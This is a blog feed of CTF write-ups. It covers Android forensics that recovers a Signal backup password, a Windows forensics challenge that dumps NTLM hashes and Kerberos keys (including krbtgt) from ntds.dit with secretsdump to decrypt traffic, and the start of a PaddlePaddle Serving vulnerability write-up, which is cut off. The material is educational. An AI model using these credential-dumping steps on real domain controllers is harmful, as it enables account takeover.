<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ./unyaffs2 -p 512 /home/crazyman/Desktop/gesture.img Androidtmp</span><br><span class="line"></span><br><span class="line">sudo ./unyaffs2 -p 512 &#123;input_image_path&#125; &#123;output_path&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/2FXgufd.png"></p>
<p>result:</p>
<p><img src="https://i.imgur.com/K419Ug9.png"></p>
<p>wow,we have already extract them,Now it’s time for us to analyze them</p>
<p>and we can find someting in <code>Android/data/com.android.gallery3d/cache/.nomedia/.latentorism</code></p>
<p>As you know,cache is important in forensics.Meanwhile it is also the cache of gallery. So It is an picture.</p>
<p>rename it as png </p>
<p><img src="https://i.imgur.com/VpgnQB9.png"></p>
<p>we can see some number on it :D</p>
<p>but it looks strange.</p>
<p>aha This is the image that has been flipped left and right</p>
<p>Now repair it</p>
<p>script:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line">image = cv2.imread(<span class="string">&quot;latentorism.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Flipped Horizontally</span></span><br><span class="line">h_flip = cv2.flip(image, <span class="number">1</span>)</span><br><span class="line">cv2.imwrite(<span class="string">&quot;latentorism-h.png&quot;</span>, h_flip)</span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/9ZZDARS.png"></p>
<p>now we got <code>709004999298182874947842717955</code> but it seems not hex.What use are they for?</p>
<p>Don’t be worry,we will find another data.</p>
<p>look at <code>Signal\Backups\</code></p>
<p>it has signal-2021-10-21-08-01-13.backup</p>
<p>what’s it ? how to decode it?</p>
<p>google is a good way to solve these :D</p>
<p><img src="https://i.imgur.com/2s1VIew.png"></p>
<p>then,you can find it </p>
<p><a href="https://github.com/pajowu/signal-backup-decode">https://github.com/pajowu/signal-backup-decode</a></p>
<p>install it and run the command to decode signal file</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">signal-backup-decode -p 709004999298182874947842717955 signal-2021-10-21-08-01-13.backup</span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/KbXGVVA.png"></p>
<p>file list:</p>
<p><img src="https://i.imgur.com/NXcBpOj.png"></p>
<p>now we will parse the signal_backup.db file</p>
<p>use SQLite Viewer to analyze the data </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM sms;</span><br></pre></td></tr></table></figure>

<p>we can find morse code :D</p>
<p><img src="https://i.imgur.com/3n6NtsK.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-. ...-- ...- . .-. ..--.- --... .-. ..- ..... - ..--.- - .---- -. . ..--.- ... . ...-- ..--.- .. ..--.- ....- ..--.- -. ----- - .... .---- -. -.... ..--.- .. ..... ..--.- .-.. ----- ----- ..--.- .--. ...-- .-. -.-. . -. --... ..--.- ... ...-- -.-. ..- .-. .</span><br></pre></td></tr></table></figure>

<p>decode morse</p>
<p>use <a href="http://www.hiencode.com/morse.html">http://www.hiencode.com/morse.html</a></p>
<p><img src="https://i.imgur.com/APM6bcW.png"></p>
<p>flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ASIS&#123;n3ver_7ru5t_t1ne_se3_i_4_n0th1n6_i5_l00_p3rcen7_s3cure&#125;</span><br></pre></td></tr></table></figure>


<p>Knowlege:</p>
<ol>
<li>extract YAFFS filesystem</li>
<li>gallery image cache</li>
<li>decode android signal backup</li>
<li>parse and analyze data </li>
</ol>
<p>Thanks for ASIS CTF.Nice challenge</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Misc</tag>
        <tag>CTF</tag>
        <tag>Forensics</tag>
        <tag>YAFFS</tag>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>Insomni’hack teaser 2023 - Autopsy</title>
    <url>/2023/01/23/Insomni%E2%80%99hack-teaser-2023-Autopsy/</url>
    <content><![CDATA[<h1 id="Insomni’hack-teaser-2023-Autopsy"><a href="#Insomni’hack-teaser-2023-Autopsy" class="headerlink" title="Insomni’hack teaser 2023 - Autopsy:"></a>Insomni’hack teaser 2023 - Autopsy:</h1><p>In the Lunar New Year, I played Insomni’hack teaser 2023, one of the topics labeled forensics, realistic, windows aroused my interest, I solved him. And I learned some knowledge from it. This is the record writeup</p>
<h2 id="Autopsy"><a href="#Autopsy" class="headerlink" title="Autopsy:"></a>Autopsy:</h2><p>Wireshark loads through the export object and selects http, save all and then filters to get three files <code>SYSTEM</code>, <code>SECURITY</code>, <code>ntds.dit</code></p>
<p><img src="https://i.imgur.com/K9BHIYn.png"></p>
<p>Then after searching, you can learn some relevant content about credential extraction</p>
<p><a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
<p>Through some things made by <code>secretdump.py</code>, it seems that it is not very useful. But it may be used to extract the key to decrypt the traffic</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crazyman@ubuntu:~/Desktop/impacket$ secretsdump.py -security ../SECURITY -system ../SYSTEM LOCAL</span><br><span class="line">Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x805486c875e5e6992d3d2afeb72c6999</span><br><span class="line">[*] Dumping cached domain logon information (domain/username:hash)</span><br><span class="line">[*] Dumping LSA Secrets</span><br><span class="line">[*] $MACHINE.ACC </span><br><span class="line">$MACHINE.ACC:plain_password_hex:230c30b271c944c2d5e2e122906c6f4415b8d92a7c50668bcbe78abb095d21ab78baf08c56812106fd8bfefef43fef379c68048b3207333f9aeea58ffdc55c0cc49031033aa4fa9569e847d54b79a5ab65efc364b54f450a5f4dd85110caf41f1e8c9ae289eaf0f580c999c054494324c0920c1b5035ad11f46e16b161b80ad10c21cd3fc37ce34ede6697a4de01cf5f96bd80adc385f616396c149c42a2efee76a2ec4f7c5cd3d4c4d75d3317cdfc22ae52a83fd417b504afe973c05b0defcdc6f1412c07d83411b6cc546703a198c4509d6df470ac91a7f4a1d70caffc156eba4d0cc24a3700987991768806d91056</span><br><span class="line">$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:c9c59098f8f050ad394b7369b76986f1</span><br><span class="line">[*] DPAPI_SYSTEM </span><br><span class="line">dpapi_machinekey:0xf886ff495f92f889f3580bed92143aa26bdc300d</span><br><span class="line">dpapi_userkey:0x3ea213645556520d1de3a38beaa29bf6dce646ee</span><br><span class="line">[*] NL$KM </span><br><span class="line"> 0000   AE 82 9A 9B 3F 82 34 D5  AE 77 E9 23 FC 42 EF A8   ....?.4..w.#.B..</span><br><span class="line"> 0010   D2 63 69 6E E4 08 FB BE  BF CB DC 3A 4D FD 08 0E   .cin.......:M...</span><br><span class="line"> 0020   7B F7 C3 EF E0 00 90 AA  04 9A 87 AB 65 BB A8 06   &#123;...........e...</span><br><span class="line"> 0030   F4 01 4A 85 4C FE 13 39  A5 23 B9 51 F8 35 42 07   ..J.L..9.#.Q.5B.</span><br><span class="line">NL$KM:ae829a9b3f8234d5ae77e923fc42efa8d263696ee408fbbebfcbdc3a4dfd080e7bf7c3efe00090aa049a87ab65bba806f4014a854cfe1339a523b951f8354207</span><br><span class="line">[*] Cleaning up... </span><br><span class="line"></span><br><span class="line">crazyman@ubuntu:~/Desktop/impacket$ secretsdump.py -ntds ../ntds.dit -system ../SYSTEM LOCAL</span><br><span class="line">Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x805486c875e5e6992d3d2afeb72c6999</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching for pekList, be patient</span><br><span class="line">[*] PEK # 0 found and decrypted: d550dd0de3e2e8c1633034fd19049cef</span><br><span class="line">[*] Reading and decrypting hashes from ../ntds.dit </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf7c9b980dd43ae8f651d02fe20ac915:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">SUPERMAN$:1000:aad3b435b51404eeaad3b435b51404ee:c9c59098f8f050ad394b7369b76986f1:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5e696d38da69b2597fd1039bea113486:::</span><br><span class="line">inscorp.com\adm-drp:1103:aad3b435b51404eeaad3b435b51404ee:5c4dbe6a8a44446f8d2899ff08ea14f2:::</span><br><span class="line">[*] Kerberos keys from ../ntds.dit </span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:dc8af90d000bf2fe011b5637e46840f59efd7a9f36c974e6c92e098e3c40b247</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:2a3e3f78faa3f28b6ef4bac2273b305f</span><br><span class="line">Administrator:des-cbc-md5:3862c83b865d80da</span><br><span class="line">SUPERMAN$:aes256-cts-hmac-sha1-96:a7396d86f611e874622bd6c2b4ae742cbe4ed2f418e9b885ef37061fa398112a</span><br><span class="line">SUPERMAN$:aes128-cts-hmac-sha1-96:e5a8b63dcc276332a466f9502f548273</span><br><span class="line">SUPERMAN$:des-cbc-md5:3bb910319efe2a16</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:e072886952ce6c9cc5ddd09e2191b807c003dd7a2cabf407d4ab4d7ae9993d03</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:a14abd37bd7767441e20166f032f94cf</span><br><span class="line">krbtgt:des-cbc-md5:54409104e0263243</span><br><span class="line">inscorp.com\adm-drp:aes256-cts-hmac-sha1-96:6102c3cfc067ca5c989c40a7a34b4166536904e646704ada56b25fa0c07000d5</span><br><span class="line">inscorp.com\adm-drp:aes128-cts-hmac-sha1-96:c7e5d32f0b9e7da9d4c8cabac07b9277</span><br><span class="line">inscorp.com\adm-drp:des-cbc-md5:70ad4cdf7326dc62</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure>

<p>After searching later, I found this article <a href="https://medium.com/tenable-techblog/decrypt-encrypted-stub-data-in-wireshark-deb132c076e7">https://medium.com/tenable-techblog/decrypt-encrypted-stub-data-in-wireshark-deb132c076e7</a></p>
<p>So get the script to generate keytab from <a href="https://github.com/dirkjanm/forest-trust-tools/blob/master/keytab.py">https://github.com/dirkjanm/forest-trust-tools/blob/master/keytab.py</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack, pack</span><br><span class="line"><span class="keyword">from</span> impacket.structure <span class="keyword">import</span> Structure</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Keytab structure from http://www.ioplex.com/utilities/keytab.txt</span></span><br><span class="line">  <span class="comment"># keytab &#123;</span></span><br><span class="line">  <span class="comment">#     uint16_t file_format_version;                    /* 0x502 */</span></span><br><span class="line">  <span class="comment">#     keytab_entry entries[*];</span></span><br><span class="line">  <span class="comment"># &#125;;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># keytab_entry &#123;</span></span><br><span class="line">  <span class="comment">#     int32_t size;</span></span><br><span class="line">  <span class="comment">#     uint16_t num_components;    /* sub 1 if version 0x501 */</span></span><br><span class="line">  <span class="comment">#     counted_octet_string realm;</span></span><br><span class="line">  <span class="comment">#     counted_octet_string components[num_components];</span></span><br><span class="line">  <span class="comment">#     uint32_t name_type;   /* not present if version 0x501 */</span></span><br><span class="line">  <span class="comment">#     uint32_t timestamp;</span></span><br><span class="line">  <span class="comment">#     uint8_t vno8;</span></span><br><span class="line">  <span class="comment">#     keyblock key;</span></span><br><span class="line">  <span class="comment">#     uint32_t vno; /* only present if &gt;= 4 bytes left in entry */</span></span><br><span class="line">  <span class="comment"># &#125;;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># counted_octet_string &#123;</span></span><br><span class="line">  <span class="comment">#     uint16_t length;</span></span><br><span class="line">  <span class="comment">#     uint8_t data[length];</span></span><br><span class="line">  <span class="comment"># &#125;;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># keyblock &#123;</span></span><br><span class="line">  <span class="comment">#     uint16_t type;</span></span><br><span class="line">  <span class="comment">#     counted_octet_string;</span></span><br><span class="line">  <span class="comment"># &#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">KeyTab</span>(<span class="title class_ inherited__">Structure</span>):</span><br><span class="line">    structure = (</span><br><span class="line">        (<span class="string">&#x27;file_format_version&#x27;</span>,<span class="string">&#x27;H=517&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;keytab_entry&#x27;</span>, <span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fromString</span>(<span class="params">self, data</span>):</span><br><span class="line">        self.entries = []</span><br><span class="line">        Structure.fromString(self, data)</span><br><span class="line">        data = self[<span class="string">&#x27;keytab_entry&#x27;</span>]</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(data) != <span class="number">0</span>:</span><br><span class="line">            ktentry = KeyTabEntry(data)</span><br><span class="line"></span><br><span class="line">            data = data[<span class="built_in">len</span>(ktentry.getData()):]</span><br><span class="line">            self.entries.append(ktentry)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getData</span>(<span class="params">self</span>):</span><br><span class="line">        self[<span class="string">&#x27;keytab_entry&#x27;</span>] = <span class="string">b&#x27;&#x27;</span>.join([entry.getData() <span class="keyword">for</span> entry <span class="keyword">in</span> self.entries])</span><br><span class="line">        data = Structure.getData(self)</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OctetString</span>(<span class="title class_ inherited__">Structure</span>):</span><br><span class="line">    structure = (</span><br><span class="line">        (<span class="string">&#x27;len&#x27;</span>, <span class="string">&#x27;&gt;H-value&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">KeyTabContentRest</span>(<span class="title class_ inherited__">Structure</span>):</span><br><span class="line">    structure = (</span><br><span class="line">        (<span class="string">&#x27;name_type&#x27;</span>, <span class="string">&#x27;&gt;I=1&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;&gt;I=0&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;vno8&#x27;</span>, <span class="string">&#x27;B=2&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;keytype&#x27;</span>, <span class="string">&#x27;&gt;H&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;keylen&#x27;</span>, <span class="string">&#x27;&gt;H-key&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">KeyTabContent</span>(<span class="title class_ inherited__">Structure</span>):</span><br><span class="line">    structure = (</span><br><span class="line">        (<span class="string">&#x27;num_components&#x27;</span>, <span class="string">&#x27;&gt;h&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;realmlen&#x27;</span>, <span class="string">&#x27;&gt;h-realm&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;realm&#x27;</span>, <span class="string">&#x27;:&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;components&#x27;</span>, <span class="string">&#x27;:&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;restdata&#x27;</span>,<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fromString</span>(<span class="params">self, data</span>):</span><br><span class="line">        self.components = []</span><br><span class="line">        Structure.fromString(self, data)</span><br><span class="line">        data = self[<span class="string">&#x27;components&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self[<span class="string">&#x27;num_components&#x27;</span>]):</span><br><span class="line">            ktentry = OctetString(data)</span><br><span class="line"></span><br><span class="line">            data = data[ktentry[<span class="string">&#x27;len&#x27;</span>]+<span class="number">2</span>:]</span><br><span class="line">            self.components.append(ktentry)</span><br><span class="line">        self.restfields = KeyTabContentRest(data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getData</span>(<span class="params">self</span>):</span><br><span class="line">        self[<span class="string">&#x27;num_components&#x27;</span>] = <span class="built_in">len</span>(self.components)</span><br><span class="line">        <span class="comment"># We modify the data field to be able to use the</span></span><br><span class="line">        <span class="comment"># parent class parsing</span></span><br><span class="line">        self[<span class="string">&#x27;components&#x27;</span>] = <span class="string">b&#x27;&#x27;</span>.join([component.getData() <span class="keyword">for</span> component <span class="keyword">in</span> self.components])</span><br><span class="line">        self[<span class="string">&#x27;restdata&#x27;</span>] = self.restfields.getData()</span><br><span class="line">        data = Structure.getData(self)</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">KeyTabEntry</span>(<span class="title class_ inherited__">Structure</span>):</span><br><span class="line">    structure = (</span><br><span class="line">        (<span class="string">&#x27;size&#x27;</span>,<span class="string">&#x27;&gt;I-content&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;content&#x27;</span>,<span class="string">&#x27;:&#x27;</span>, KeyTabContent)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add your own keys here!</span></span><br><span class="line"><span class="comment"># Keys are tuples in the form (keytype, &#x27;hexencodedkey&#x27;)</span></span><br><span class="line"><span class="comment"># Common keytypes for Windows:</span></span><br><span class="line"><span class="comment"># 23: RC4</span></span><br><span class="line"><span class="comment"># 18: AES-256</span></span><br><span class="line"><span class="comment"># 17: AES-128</span></span><br><span class="line"><span class="comment"># Wireshark takes any number of keys in the keytab, so feel free to add</span></span><br><span class="line"><span class="comment"># krbtgt keys, service keys, trust keys etc</span></span><br><span class="line">keys = [</span><br><span class="line">    (<span class="number">23</span>, <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>),</span><br><span class="line">    (<span class="number">18</span>, <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>),</span><br><span class="line">    (<span class="number">17</span>, <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>),</span><br><span class="line">    (<span class="number">18</span>, <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>),</span><br><span class="line">    (<span class="number">23</span>, <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">nkt = KeyTab()</span><br><span class="line">nkt.entries = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> keys:</span><br><span class="line">    ktcr = KeyTabContentRest()</span><br><span class="line">    ktcr[<span class="string">&#x27;keytype&#x27;</span>] = key[<span class="number">0</span>]</span><br><span class="line">    ktcr[<span class="string">&#x27;key&#x27;</span>] = binascii.unhexlify(key[<span class="number">1</span>])</span><br><span class="line">    nktcontent = KeyTabContent()</span><br><span class="line">    nktcontent.restfields = ktcr</span><br><span class="line">    <span class="comment"># The realm here doesn&#x27;t matter for wireshark but does of course for a real keytab</span></span><br><span class="line">    nktcontent[<span class="string">&#x27;realm&#x27;</span>] = <span class="string">b&#x27;TESTSEGMENT.LOCAL&#x27;</span></span><br><span class="line">    krbtgt = OctetString()</span><br><span class="line">    krbtgt[<span class="string">&#x27;value&#x27;</span>] = <span class="string">&#x27;krbtgt&#x27;</span></span><br><span class="line">    nktcontent.components = [krbtgt]</span><br><span class="line">    nktentry = KeyTabEntry()</span><br><span class="line">    nktentry[<span class="string">&#x27;content&#x27;</span>] = nktcontent</span><br><span class="line">    nkt.entries.append(nktentry)</span><br><span class="line"></span><br><span class="line">data = nkt.getData()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Usage: keytab.py &lt;outputfile&gt;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Keys should be written to the source manually&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">        outfile.write(data)</span><br></pre></td></tr></table></figure>

<p>Then fill in the key obtained above into the keys of lines 112-118 of the script</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">keys = [</span><br><span class="line">    (<span class="number">23</span>, <span class="string">&#x27;5e696d38da69b2597fd1039bea113486&#x27;</span>),<span class="comment">#krbtgt</span></span><br><span class="line">    (<span class="number">18</span>, <span class="string">&#x27;e072886952ce6c9cc5ddd09e2191b807c003dd7a2cabf407d4ab4d7ae9993d03&#x27;</span>),</span><br><span class="line">    (<span class="number">17</span>, <span class="string">&#x27;a14abd37bd7767441e20166f032f94cf&#x27;</span>),</span><br><span class="line">    (<span class="number">23</span>, <span class="string">&#x27;cf7c9b980dd43ae8f651d02fe20ac915&#x27;</span>),<span class="comment">#Administrator</span></span><br><span class="line">    (<span class="number">18</span>, <span class="string">&#x27;dc8af90d000bf2fe011b5637e46840f59efd7a9f36c974e6c92e098e3c40b247&#x27;</span>),</span><br><span class="line">    (<span class="number">17</span>, <span class="string">&#x27;2a3e3f78faa3f28b6ef4bac2273b305f&#x27;</span>),</span><br><span class="line">    (<span class="number">23</span>, <span class="string">&#x27;c9c59098f8f050ad394b7369b76986f1&#x27;</span>),<span class="comment">#SUPERMAN$</span></span><br><span class="line">    (<span class="number">18</span>, <span class="string">&#x27;a7396d86f611e874622bd6c2b4ae742cbe4ed2f418e9b885ef37061fa398112a&#x27;</span>),</span><br><span class="line">    (<span class="number">17</span>, <span class="string">&#x27;e5a8b63dcc276332a466f9502f548273&#x27;</span>),</span><br><span class="line">    (<span class="number">23</span>, <span class="string">&#x27;5c4dbe6a8a44446f8d2899ff08ea14f2&#x27;</span>),<span class="comment">#inscorp.com\adm-drp</span></span><br><span class="line">    (<span class="number">18</span>, <span class="string">&#x27;6102c3cfc067ca5c989c40a7a34b4166536904e646704ada56b25fa0c07000d5&#x27;</span>),</span><br><span class="line">    (<span class="number">17</span>, <span class="string">&#x27;c7e5d32f0b9e7da9d4c8cabac07b9277&#x27;</span>)</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>Run to get the keytab file required for decryption, and then import it into wireshark</p>
<p><img src="https://i.imgur.com/Yjmy4mA.png"></p>
<p>After successful import, it can be found that the TaskScheduler traffic has been successfully decrypted and some plaintext can be seen</p>
<p><img src="https://i.imgur.com/nwnzGVH.png"></p>
<p>There are not many streams, so you can find the flag at stream number 16303</p>
<p><img src="https://i.imgur.com/KtiYCjM.png"></p>
<p>then got flag –&gt; <code>INS&#123;N1c3_j0b_Dud3_y0u_F0und_m3!&#125;</code></p>
<p>Hope u like this writeup</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Misc</tag>
        <tag>CTF</tag>
        <tag>Forensics</tag>
        <tag>Windows</tag>
        <tag>Kerberos Protocol</tag>
      </tags>
  </entry>
  <entry>
    <title>RealWorld CTF 5th - Paddle Writeup</title>
    <url>/2023/01/30/RealWorld-CTF-5th-Paddle-Writeup/</url>
    <content><![CDATA[<h1 id="RealWorld-CTF-5th-Paddle-Writeup"><a href="#RealWorld-CTF-5th-Paddle-Writeup" class="headerlink" title="RealWorld CTF 5th - Paddle Writeup:"></a>RealWorld CTF 5th - Paddle Writeup:</h1><p>solved this challenge with <code>thezzisu</code></p>
<p>By reading docker, it is mainly the following modules:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">paddle-serving-server==0.9.0 \</span><br><span class="line">paddle-serving-client==0.9.0 \</span><br><span class="line">paddle-serving-app==0.9.0 \</span><br><span class="line">paddlepaddle==2.3.0</span><br></pre></td></tr></table></figure>

<p>From <code>WORKDIR /usr/local/lib/python3.6/site-packages/paddle_serving_server/env_check/simple_web_service</code>,<code>CMD [&quot;python&quot;, &quot;web_service.py&quot;]</code> in dockerfile, it is known that the loading of its main body is mainly <code>paddle-serving-server</code></p>
<p>Search through pypi and download to the source code <a href="https://files.pythonhosted.org/packages/17/2d/e0f69d0ca122dd9ba9f8467bead36df3a8479ac69c8a1f631f39092ebd65/paddle_serving_server-0.9.0-py3-none-any.whl">https://files.pythonhosted.org/packages/17/2d/e0f69d0ca122dd9ba9f8467bead36df3a8479ac69c8a1f631f39092ebd65/paddle_serving_server-0.9.0-py3-none-any.whl</a><br>Or through the github project <a href="https://github.com/PaddlePaddle/Serving">https://github.com/PaddlePaddle/Serving</a></p>
<p>combined with the relevant support of AI, you can find vulnerabilities here<br><a href="https://github.com/PaddlePaddle/Serving/blob/bdf4ada65e40c9d8146b9aac14a8cf406d9ba37e/python/pipeline/operator.py#L1753">https://github.com/PaddlePaddle/Serving/blob/bdf4ada65e40c9d8146b9aac14a8cf406d9ba37e/python/pipeline/operator.py#L1753</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RequestOp</span>(<span class="title class_ inherited__">Op</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    RequestOp is a special Op, for unpacking one request package. If the</span></span><br><span class="line"><span class="string">    request needs one special unpackaging method, you need to inherit class</span></span><br><span class="line"><span class="string">    RequestOp and rewrite function unpack_request_package.Notice!!! Class</span></span><br><span class="line"><span class="string">    RequestOp does not run preprocess, process, postprocess.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Initialize the RequestOp</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># PipelineService.name = &quot;@DAGExecutor&quot;</span></span><br><span class="line">        <span class="built_in">super</span>(RequestOp, self).__init__(name=<span class="string">&quot;@DAGExecutor&quot;</span>, input_ops=[])</span><br><span class="line">        <span class="comment"># init op</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.init_op()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            _LOGGER.critical(<span class="string">&quot;Op(Request) Failed to init: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e))</span><br><span class="line">            os._exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">proto_tensor_2_numpy</span>(<span class="params">self, tensor</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Convert proto tensor to numpy array, The supported types are as follows:</span></span><br><span class="line"><span class="string">                INT64</span></span><br><span class="line"><span class="string">                FP32</span></span><br><span class="line"><span class="string">		INT32</span></span><br><span class="line"><span class="string">		FP64</span></span><br><span class="line"><span class="string">		INT16</span></span><br><span class="line"><span class="string">		FP16</span></span><br><span class="line"><span class="string">		BF16</span></span><br><span class="line"><span class="string">		UINT8</span></span><br><span class="line"><span class="string">		INT8</span></span><br><span class="line"><span class="string">		BOOL</span></span><br><span class="line"><span class="string">                BYTES</span></span><br><span class="line"><span class="string">        Unsupported type:</span></span><br><span class="line"><span class="string">                STRING</span></span><br><span class="line"><span class="string">                COMPLEX64</span></span><br><span class="line"><span class="string">                COMPLEX128</span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            tensor: one tensor in request.tensors.</span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            np_data: np.ndnumpy, the tensor data is converted to numpy.</span></span><br><span class="line"><span class="string">            lod_info: np.ndnumpy, lod info of the tensor data, None default.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> tensor <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> tensor.elem_type <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> tensor.name <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            _LOGGER.error(<span class="string">&quot;input params of tensor is wrong. tensor: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                tensor))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Set dim shape</span></span><br><span class="line">        dims = []</span><br><span class="line">        <span class="keyword">if</span> tensor.shape <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            dims.append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> one_dim <span class="keyword">in</span> tensor.shape:</span><br><span class="line">                dims.append(one_dim)</span><br><span class="line"></span><br><span class="line">        <span 